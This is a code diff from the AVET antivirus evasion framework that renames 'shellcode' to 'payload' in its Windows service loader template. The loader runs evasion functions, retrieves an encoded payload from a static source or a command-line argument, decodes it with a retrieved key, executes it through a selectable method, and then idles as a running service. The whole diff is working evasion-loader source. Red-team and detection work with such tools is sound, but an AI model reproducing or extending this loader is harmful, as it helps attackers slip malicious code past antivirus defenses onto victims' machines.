@@ -49,10 +49,10 @@ Web: https://github.com/govolution/avet
 // Include implementation files needed for the selected functions.
 // The included files are assembled by the build script, in which functions are selected.
 #include "evasion/evasion.include"
-#include "get_shellcode/get_shellcode.include"
+#include "get_payload/get_payload.include"
 #include "get_key/get_key.include"
-#include "decode_shellcode/decode_shellcode.include"
-#include "shellcode_binder/shellcode_binder.include"
+#include "decode_payload/decode_payload.include"
+#include "payload_execution_method/payload_execution_method.include"
 
 
 // Set how many evasion functions can be used at maximum
@@ -144,10 +144,10 @@ void ServiceMain(int argc, char **argv) {
 	
 	
 	// Function prototype pointers to store selected functions.	
-	unsigned char *(*get_shellcode) (char *arg1, int *shellcode_size) = NULL;
+	unsigned char *(*get_payload) (char *arg1, int *payload_size) = NULL;
 	unsigned char *(*get_key) (char *arg1, int *key_length) = NULL;
-	void (*decode_shellcode) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext) = NULL;
-	void (*shellcode_binder) (unsigned char *shellcode) = NULL;
+	void (*decode_payload) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext) = NULL;
+	void (*payload_execution_method) (unsigned char *payload) = NULL;
 	
 	// Define array to store multiple evasion functions.
 	// Set static array size of 10 because dynamic size handling in cooperation with build scripts would be too messy.
@@ -162,10 +162,10 @@ void ServiceMain(int argc, char **argv) {
 	// Assign selected functions to prototypes
 	// Included assignment code is assembled by the build script
 	#include "evasion/evasion.assign"
-	#include "get_shellcode/get_shellcode.assign"
+	#include "get_payload/get_payload.assign"
 	#include "get_key/get_key.assign"
-	#include "decode_shellcode/decode_shellcode.assign"
-	#include "shellcode_binder/shellcode_binder.assign"
+	#include "decode_payload/decode_payload.assign"
+	#include "payload_execution_method/payload_execution_method.assign"
 			
 	// Execute evasion functions
 	if(evasion_functions[0] == NULL) {
@@ -179,22 +179,22 @@ void ServiceMain(int argc, char **argv) {
 		}
 	}	
 	
-	// Retrieve encoded shellcode
-	int shellcode_size = 0;
-	// If shellcode is retrieved statically, set the argument acoordingly to ensure that the correct data is delivered
-	#ifdef STATIC_SHELLCODE	
-	unsigned char *encoded_shellcode = get_shellcode("static_shellcode", &shellcode_size);
+	// Retrieve encoded payload
+	int payload_size = 0;
+	// If payload is retrieved statically, set the argument acoordingly to ensure that the correct data is delivered
+	#ifdef STATIC_PAYLOAD	
+	unsigned char *encoded_payload = get_payload("static_payload", &payload_size);
 	#else
-	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);
+	unsigned char *encoded_payload = get_payload(argv[1], &payload_size);
 	#endif
-	if(encoded_shellcode != NULL) {
-		DEBUG_PRINT("Retrieved shellcode data, size is %d bytes.\n", shellcode_size);
-		for(int i = 0; i < shellcode_size; i++) {
-			DEBUG_PRINT("%02x ", encoded_shellcode[i]);
+	if(encoded_payload != NULL) {
+		DEBUG_PRINT("Retrieved payload data, size is %d bytes.\n", payload_size);
+		for(int i = 0; i < payload_size; i++) {
+			DEBUG_PRINT("%02x ", encoded_payload[i]);
 		}
 		DEBUG_PRINT("\n\n");
 	} else {
-		DEBUG_PRINT("No shellcode retrieved.\n");
+		DEBUG_PRINT("No payload retrieved.\n");
 	}
 	
 	// Retrieve crypto key
@@ -215,26 +215,26 @@ void ServiceMain(int argc, char **argv) {
 		DEBUG_PRINT("No key retrieved.\n");
 	}
 		
-	// Decode shellcode
-	unsigned char* shellcode = (unsigned char *) malloc(shellcode_size);
-	DEBUG_PRINT("Calling decode_shellcode...\n");
-	decode_shellcode(encoded_shellcode, shellcode_size, key, key_length, shellcode);
-	DEBUG_PRINT("Decoded shellcode: \n");	
-	for(int i = 0; i < shellcode_size; i++) {
-		DEBUG_PRINT("%02x ", shellcode[i]);
+	// Decode payload
+	unsigned char* payload = (unsigned char *) malloc(payload_size);
+	DEBUG_PRINT("Calling decode_payload...\n");
+	decode_payload(encoded_payload, payload_size, key, key_length, payload);
+	DEBUG_PRINT("Decoded payload: \n");	
+	for(int i = 0; i < payload_size; i++) {
+		DEBUG_PRINT("%02x ", payload[i]);
 	}
 	DEBUG_PRINT("\n\n");
 	
-	// Bind and execute shellcode
-	DEBUG_PRINT("Calling shellcode_binder...\n");
-	shellcode_binder(shellcode);
+	// Bind and execute payload
+	DEBUG_PRINT("Calling payload_execution_method...\n");
+	payload_execution_method(payload);
 	
 	DEBUG_PRINT("Execution finished.\n");	
 		
 	
 	// Service worker loop
 	while(ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
-		// Stay idle after invoking shellcode
+		// Stay idle after invoking payload
 		Sleep(SLEEP_TIME);
 	}		
 }
